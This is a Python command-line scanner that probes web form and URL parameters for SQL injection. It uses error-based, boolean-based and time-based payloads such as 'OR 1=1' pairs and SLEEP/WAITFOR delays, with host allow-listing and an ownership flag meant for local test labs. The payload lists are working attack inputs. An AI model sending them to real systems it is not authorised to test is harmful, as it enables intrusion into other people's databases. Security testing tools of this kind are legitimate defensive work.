#!/usr/bin/env python3
"""
SQL Injection Scanner (authorized-testing only)
================================================

A defensive-testing tool for probing web inputs (GET/POST parameters) for
common SQL injection indicators: DB error messages, boolean-based
true/false differentials, and time-based blind delays.

LEGAL / ETHICAL GUARDRAILS (do not remove):
  - The tool refuses to run against any host that is not in ALLOWED_HOSTS
    or matched by --allow, unless the user also passes --i-own-this-target.
  - Designed for use against systems you own or are explicitly authorized
    to test, such as a local DVWA / Juice Shop / WebGoat instance.
  - Scanning systems without authorization may be illegal in your
    jurisdiction (e.g. under the US CFAA, UK Computer Misuse Act, etc).

Usage examples:
    # Test a GET parameter on a local DVWA instance
    python3 sqli_scanner.py --url "http://localhost:8080/vulnerabilities/sqli/" \\
        --method GET --params id --allow localhost --i-own-this-target

    # Test POST body fields
    python3 sqli_scanner.py --url "http://127.0.0.1:5000/login" \\
        --method POST --params username,password --allow 127.0.0.1 \\
        --i-own-this-target --concurrency 4 --rate 5

Output:
    - Console progress
    - JSON-lines log file (sqli_scan_<timestamp>.log)
    - Summary report (sqli_report_<timestamp>.json)
"""

import argparse
import concurrent.futures
import ipaddress
import json
import re
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("This tool requires the 'requests' package: pip install requests --break-system-packages")
    sys.exit(1)


# --------------------------------------------------------------------------
# Authorization / scope control
# --------------------------------------------------------------------------

# Hosts considered safe-by-default (local test environments only).
ALLOWED_HOSTS_DEFAULT = {"localhost", "127.0.0.1", "::1"}


def is_authorized_host(hostname: str, allow_list: set, allow_private_net: bool) -> bool:
    """Return True only if the target host is explicitly in-scope."""
    if hostname in ALLOWED_HOSTS_DEFAULT:
        return True
    if hostname in allow_list:
        return True
    if allow_private_net:
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_private or ip.is_loopback:
                return True
        except ValueError:
            pass
    return False


# --------------------------------------------------------------------------
# Payloads
# --------------------------------------------------------------------------

# Error-based: payloads designed to break SQL syntax and surface a DB error.
ERROR_PAYLOADS = [
    "'",
    "''",
    "\"",
    "`",
    "')",
    "';--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
]

# Boolean-based: (true_payload, false_payload) pairs. A vulnerable endpoint
# typically returns different content/length/status for the two.
BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("' OR 'a'='a", "' OR 'a'='b"),
]

# Time-based blind payloads, keyed by likely DB engine. DELAY_SECONDS is
# substituted in.
DELAY_SECONDS = 5
TIME_PAYLOAD_TEMPLATES = {
    "mysql": "' OR SLEEP({d})-- -",
    "postgres": "'; SELECT PG_SLEEP({d})-- -",
    "mssql": "'; WAITFOR DELAY '0:0:{d}'-- -",
    "sqlite": "' OR (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",  # illustrative; sqlite has no SLEEP natively
}

# Common DB error signatures to look for in response bodies.
ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"sqlstate\[",
    r"pg_query\(\)",
    r"postgresql.*error",
    r"sqlite3::",
    r"sqlite_error",
    r"ORA-\d{5}",
    r"microsoft ole db provider for odbc drivers",
    r"odbc sql server driver",
    r"unterminated string literal",
    r"syntax error at or near",
]
ERROR_REGEXES = [re.compile(sig, re.IGNORECASE) for sig in ERROR_SIGNATURES]


# --------------------------------------------------------------------------
# Rate limiter (simple token bucket, thread-safe)
# --------------------------------------------------------------------------

class RateLimiter:
    def __init__(self, requests_per_second: float):
        self.min_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        if self.min_interval <= 0:
            return
        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last
            sleep_for = self.min_interval - elapsed
            if sleep_for > 0:
                time.sleep(sleep_for)
            self._last = time.monotonic()


# --------------------------------------------------------------------------
# Data model
# --------------------------------------------------------------------------

@dataclass
class Finding:
    timestamp: str
    url: str
    method: str
    param: str
    technique: str
    payload: str
    evidence: str
    severity: str


@dataclass
class ScanStats:
    total_requests: int = 0
    errors: int = 0
    findings: list = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def record_request(self):
        with self.lock:
            self.total_requests += 1

    def record_error(self):
        with self.lock:
            self.errors += 1

    def record_finding(self, finding: Finding):
        with self.lock:
            self.findings.append(finding)


# --------------------------------------------------------------------------
# Logger
# --------------------------------------------------------------------------

class JsonlLogger:
    def __init__(self, path: str):
        self.path = path
        self._lock = threading.Lock()
        # touch the file
        open(self.path, "a").close()

    def log(self, record: dict):
        line = json.dumps(record, default=str)
        with self._lock:
            with open(self.path, "a") as f:
                f.write(line + "\n")


# --------------------------------------------------------------------------
# Core scanning logic
# --------------------------------------------------------------------------

class SqliScanner:
    def __init__(self, base_url: str, method: str, params: list, session: requests.Session,
                 rate_limiter: RateLimiter, logger: JsonlLogger, stats: ScanStats,
                 timeout: float = 10.0, extra_data: Optional[dict] = None,
                 baseline_delay_margin: float = 2.0):
        self.base_url = base_url
        self.method = method.upper()
        self.params = params
        self.session = session
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.stats = stats
        self.timeout = timeout
        self.extra_data = extra_data or {}
        self.baseline_delay_margin = baseline_delay_margin

    def _send(self, param: str, value: str) -> requests.Response:
        data = dict(self.extra_data)
        data[param] = value
        self.rate_limiter.wait()
        self.stats.record_request()
        start = time.monotonic()
        if self.method == "GET":
            resp = self.session.get(self.base_url, params=data, timeout=self.timeout)
        else:
            resp = self.session.post(self.base_url, data=data, timeout=self.timeout)
        resp.elapsed_wall = time.monotonic() - start
        return resp

    def _log_attempt(self, param, technique, payload, resp=None, error=None):
        record = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "url": self.base_url,
            "method": self.method,
            "param": param,
            "technique": technique,
            "payload": payload,
        }
        if resp is not None:
            record["status_code"] = resp.status_code
            record["response_length"] = len(resp.content)
            record["elapsed_s"] = round(getattr(resp, "elapsed_wall", 0), 3)
        if error:
            record["error"] = str(error)
        self.logger.log(record)

    def test_error_based(self, param: str):
        for payload in ERROR_PAYLOADS:
            try:
                resp = self._send(param, payload)
            except requests.RequestException as e:
                self.stats.record_error()
                self._log_attempt(param, "error-based", payload, error=e)
                continue
            self._log_attempt(param, "error-based", payload, resp=resp)
            body = resp.text
            for regex in ERROR_REGEXES:
                match = regex.search(body)
                if match:
                    finding = Finding(
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        url=self.base_url, method=self.method, param=param,
                        technique="error-based",
                        payload=payload,
                        evidence=f"DB error signature matched: '{match.group(0)[:80]}'",
                        severity="high",
                    )
                    self.stats.record_finding(finding)
                    break

    def test_boolean_based(self, param: str):
        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                resp_true = self._send(param, true_payload)
                resp_false = self._send(param, false_payload)
            except requests.RequestException as e:
                self.stats.record_error()
                self._log_attempt(param, "boolean-based", f"{true_payload} / {false_payload}", error=e)
                continue
            self._log_attempt(param, "boolean-based", true_payload, resp=resp_true)
            self._log_attempt(param, "boolean-based", false_payload, resp=resp_false)

            len_true, len_false = len(resp_true.content), len(resp_false.content)
            status_true, status_false = resp_true.status_code, resp_false.status_code
            length_diff = abs(len_true - len_false)

            # Heuristic: statuses differ, or body length differs significantly
            # relative to response size, while both requests succeeded.
            if status_true != status_false or (
                length_diff > 25 and length_diff > 0.02 * max(len_true, len_false, 1)
            ):
                finding = Finding(
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    url=self.base_url, method=self.method, param=param,
                    technique="boolean-based",
                    payload=f"TRUE='{true_payload}' FALSE='{false_payload}'",
                    evidence=(f"status {status_true} vs {status_false}, "
                              f"length {len_true} vs {len_false}"),
                    severity="medium",
                )
                self.stats.record_finding(finding)

    def test_time_based(self, param: str):
        # Establish a baseline response time first.
        try:
            baseline = self._send(param, "1")
            baseline_time = getattr(baseline, "elapsed_wall", 0)
        except requests.RequestException as e:
            self.stats.record_error()
            self._log_attempt(param, "time-based-baseline", "1", error=e)
            baseline_time = 0

        for engine, template in TIME_PAYLOAD_TEMPLATES.items():
            payload = template.format(d=DELAY_SECONDS)
            try:
                resp = self._send(param, payload)
            except requests.RequestException as e:
                self.stats.record_error()
                self._log_attempt(param, f"time-based-{engine}", payload, error=e)
                continue
            elapsed = getattr(resp, "elapsed_wall", 0)
            self._log_attempt(param, f"time-based-{engine}", payload, resp=resp)

            if elapsed >= (baseline_time + DELAY_SECONDS - self.baseline_delay_margin):
                finding = Finding(
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    url=self.base_url, method=self.method, param=param,
                    technique=f"time-based ({engine})",
                    payload=payload,
                    evidence=(f"response took {elapsed:.2f}s vs baseline "
                              f"{baseline_time:.2f}s (expected +{DELAY_SECONDS}s delay)"),
                    severity="high",
                )
                self.stats.record_finding(finding)

    def run_all_for_param(self, param: str):
        self.test_error_based(param)
        self.test_boolean_based(param)
        self.test_time_based(param)


# --------------------------------------------------------------------------
# CLI / orchestration
# --------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="SQL injection scanner for AUTHORIZED targets only (DVWA, local apps).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--url", required=True, help="Target URL, e.g. http://localhost:8080/vuln.php")
    p.add_argument("--method", choices=["GET", "POST"], default="GET")
    p.add_argument("--params", required=True,
                   help="Comma-separated list of parameter names to test, e.g. id,username")
    p.add_argument("--extra-data", default="",
                   help="Comma-separated key=value pairs sent with every request "
                        "(e.g. static form fields), e.g. Submit=Submit")
    p.add_argument("--allow", action="append", default=[],
                   help="Additional hostname explicitly authorized for testing "
                        "(repeatable). E.g. --allow dvwa.testlab.local")
    p.add_argument("--allow-private-net", action="store_true",
                   help="Also allow any RFC1918 / loopback address without listing it explicitly.")
    p.add_argument("--i-own-this-target", action="store_true",
                   help="Confirms you own or are explicitly authorized to test this target. Required.")
    p.add_argument("--concurrency", type=int, default=2, help="Max concurrent worker threads (per param).")
    p.add_argument("--rate", type=float, default=5.0, help="Max requests per second (global).")
    p.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds.")
    p.add_argument("--header", action="append", default=[],
                   help="Extra HTTP header 'Key: Value' (repeatable), e.g. for auth cookies.")
    p.add_argument("--cookie", default="", help="Cookie header value, e.g. 'PHPSESSID=abc123; security=low'")
    p.add_argument("--out-prefix", default="sqli_scan", help="Prefix for output log/report filenames.")
    return p.parse_args()


def build_session(headers: list, cookie: str) -> requests.Session:
    s = requests.Session()
    for h in headers:
        if ":" not in h:
            continue
        k, v = h.split(":", 1)
        s.headers[k.strip()] = v.strip()
    if cookie:
        s.headers["Cookie"] = cookie
    s.headers.setdefault("User-Agent", "AuthorizedSQLiScanner/1.0 (defensive-testing)")
    return s


def main():
    args = parse_args()

    parsed = urlparse(args.url)
    hostname = parsed.hostname or ""

    if not args.i_own_this_target:
        print("ERROR: You must pass --i-own-this-target to confirm you are authorized "
              "to test this system. This tool refuses to run otherwise.")
        sys.exit(1)

    allow_set = set(args.allow)
    if not is_authorized_host(hostname, allow_set, args.allow_private_net):
        print(f"ERROR: Host '{hostname}' is not in the authorized scope.\n"
              f"  Allowed by default: {sorted(ALLOWED_HOSTS_DEFAULT)}\n"
              f"  Add it explicitly with --allow {hostname} (only if you are authorized),\n"
              f"  or use --allow-private-net for RFC1918/loopback ranges.")
        sys.exit(1)

    params = [p.strip() for p in args.params.split(",") if p.strip()]
    extra_data = {}
    for kv in args.extra_data.split(","):
        if "=" in kv:
            k, v = kv.split("=", 1)
            extra_data[k.strip()] = v.strip()

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = f"{args.out_prefix}_{timestamp}.log"
    report_path = f"{args.out_prefix}_report_{timestamp}.json"

    session = build_session(args.header, args.cookie)
    rate_limiter = RateLimiter(args.rate)
    logger = JsonlLogger(log_path)
    stats = ScanStats()

    scanner = SqliScanner(
        base_url=args.url, method=args.method, params=params, session=session,
        rate_limiter=rate_limiter, logger=logger, stats=stats, timeout=args.timeout,
        extra_data=extra_data,
    )

    print(f"[*] Target:      {args.url}")
    print(f"[*] Method:      {args.method}")
    print(f"[*] Parameters:  {params}")
    print(f"[*] Concurrency: {args.concurrency}   Rate limit: {args.rate} req/s")
    print(f"[*] Log file:    {log_path}")
    print("[*] Starting scan...\n")

    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(scanner.run_all_for_param, param): param for param in params}
        for fut in concurrent.futures.as_completed(futures):
            param = futures[fut]
            try:
                fut.result()
                print(f"[+] Finished testing parameter: {param}")
            except Exception as e:
                print(f"[!] Error testing parameter {param}: {e}")
    elapsed = time.time() - start_time

    report = {
        "target": args.url,
        "method": args.method,
        "params_tested": params,
        "started_at": datetime.fromtimestamp(start_time, tz=timezone.utc).isoformat(),
        "duration_seconds": round(elapsed, 2),
        "total_requests": stats.total_requests,
        "request_errors": stats.errors,
        "findings_count": len(stats.findings),
        "findings": [asdict(f) for f in stats.findings],
    }
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[*] Scan complete in {elapsed:.1f}s. {stats.total_requests} requests sent, "
          f"{stats.errors} errors.")
    if stats.findings:
        print(f"[!] {len(stats.findings)} potential SQL injection indicator(s) found:")
        for f in stats.findings:
            print(f"    - [{f.severity.upper()}] param='{f.param}' technique={f.technique}")
            print(f"      evidence: {f.evidence}")
    else:
        print("[*] No SQL injection indicators detected with the tested payloads.")
    print(f"\n[*] Full log:    {log_path}")
    print(f"[*] Full report: {report_path}")


if __name__ == "__main__":
    main()
